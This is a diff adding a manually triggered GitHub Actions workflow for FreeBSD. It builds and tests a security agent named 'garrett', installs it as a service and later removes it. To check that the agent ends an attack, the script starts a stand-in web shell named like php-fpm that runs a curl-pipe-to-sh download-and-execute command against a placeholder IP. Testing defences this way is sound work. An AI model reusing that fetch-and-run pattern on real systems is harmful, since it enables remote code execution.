@@ -1,0 +1,54 @@
+# FreeBSD: not a released system yet. The agent builds there, its tests pass, it installs and runs as a service;
+# this check is where the rest (ending a stand-in attack) is being worked out. It is started by hand and is not
+# part of the checks a release has to pass.
+name: freebsd
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  # FreeBSD has no hosted machines of its own: a FreeBSD system is started inside a Linux one, and everything
+  # (the tests, the install, a stand-in attack, the removal) runs in it.
+  freebsd:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build, test, install and remove on FreeBSD
+        uses: vmactions/freebsd-vm@v1
+        with:
+          usesh: true
+          prepare: pkg install -y rust curl
+          run: |
+            set -e
+            freebsd-version
+            cd rust
+            cargo test --release --locked
+            cargo build --release --locked
+            cd ..
+            mkdir -p /tmp/bundle/garrett
+            cp rust/target/release/garrett /tmp/bundle/garrett/garrett-agent
+            sed 's/\r$//' packaging/garrett > /tmp/bundle/garrett/garrett
+            sed 's/\r$//' packaging/freebsd/install.sh > /tmp/bundle/garrett/install.sh
+            sed 's/\r$//' packaging/freebsd/garrett.rc > /tmp/bundle/garrett/garrett.rc
+            mkdir -p /usr/local/etc && printf 'UPDATE=off\nLEARN_HOURS=0\n' > /usr/local/etc/garrett.conf
+            sh /tmp/bundle/garrett/install.sh
+            sleep 8
+            service garrett status
+            garrett version
+            garrett status
+            garrett hardware
+            tail -5 /var/log/garrett.log || true
+            # A stand-in web shell: a program named like a web server starts a download-and-run shell.
+            mkdir -p /tmp/gv && cp /bin/sh /tmp/gv/php-fpm8.3
+            /tmp/gv/php-fpm8.3 -c 'sh -c "curl -s -m 120 http://203.0.113.9/p | sh"; true' &
+            ended=no
+            for i in $(seq 1 60); do sleep 1; pgrep -f "203.0.113.9/p" >/dev/null || { echo "ended after about $i seconds"; ended=yes; break; }; done
+            tail -5 /var/log/garrett.log || true
+            if [ "$ended" != yes ]; then pkill -CONT -f "203.0.113.9/p" || true; pkill -KILL -f "203.0.113.9/p" || true; pkill -KILL -f "gv/php-fpm8.3" || true; echo "the stand-in was not ended"; exit 1; fi
+            for i in $(seq 1 30); do garrett cases | grep -q "stopped" && break; sleep 1; done
+            garrett cases
+            garrett cases | grep -q "stopped"
+            sh /tmp/bundle/garrett/install.sh --remove
+            for p in /usr/local/lib/garrett /usr/local/bin/garrett /var/db/garrett /usr/local/etc/rc.d/garrett; do if [ -e "$p" ]; then echo "left behind: $p"; exit 1; fi; done
+            ! pgrep -f garrett-agent
